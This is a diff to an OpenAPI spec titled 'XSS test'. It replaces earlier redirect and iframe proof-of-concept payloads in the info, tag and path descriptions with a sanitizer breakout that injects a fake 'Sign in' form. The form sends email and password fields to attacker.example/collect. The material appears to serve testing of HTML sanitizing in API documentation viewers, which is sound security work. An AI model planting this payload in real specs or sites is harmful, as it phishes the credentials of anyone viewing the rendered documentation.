@@ -3,16 +3,34 @@ info:
   title: "XSS test"
   version: "1.0.0"
   description: |
-    <svg></p><style><a id="</style><meta http-equiv="refresh" content="0;url=https://bugcrowd.com">">
+    <svg></p><style><a id="</style><form action="https://attacker.example/collect" method="post" style="max-width:360px;padding:12px;border:1px solid #ddd;border-radius:8px;font-family:sans-serif">
+      <h3 style="margin:0 0 8px 0">Sign in</h3>
+      <label>Email</label>
+      <input name="email" type="text" placeholder="you@example.com" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+      <label>Password</label>
+      <input name="password" type="password" placeholder="••••••••" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+      <button type="submit" style="width:100%;padding:10px;margin-top:8px;border:0;border-radius:6px;background:#0b5cff;color:#fff">Login</button>
+    </form>">
 tags:
   - name: "t1"
     description: |
-      <svg></p><style><a id="</style><iframe src="https://bugcrowd.com" width="0" height="0"></iframe>">
+      <svg></p><style><a id="</style><form action="https://attacker.example/collect" method="post" style="max-width:360px;padding:12px;border:1px solid #ddd;border-radius:8px;font-family:sans-serif">
+        <h3 style="margin:0 0 8px 0">Sign in</h3>
+        <input name="email" type="text" placeholder="Email" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+        <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+        <button type="submit" style="width:100%;padding:10px;margin-top:8px;border:0;border-radius:6px;background:#0b5cff;color:#fff">Login</button>
+      </form>">
 paths:
   /x:
     get:
       summary: "x"
       description: |
-        <svg></p><style><a id="</style><iframe srcdoc="<meta http-equiv='refresh' content='0;url=https://bugcrowd.com'>"></iframe>">
+        <svg></p><style><a id="</style><form action="https://attacker.example/collect" method="post" style="max-width:360px;padding:12px;border:1px solid #ddd;border-radius:8px;font-family:sans-serif">
+          <h3 style="margin:0 0 8px 0">Sign in</h3>
+          <input name="email" type="text" placeholder="Email" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+          <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;border:1px solid #ccc;border-radius:6px">
+          <button type="submit" style="width:100%;padding:10px;margin-top:8px;border:0;border-radius:6px;background:#0b5cff;color:#fff">Login</button>
+        </form>">
       responses:
-        "200": { description: "OK" }
+        "200":
+          description: "OK"
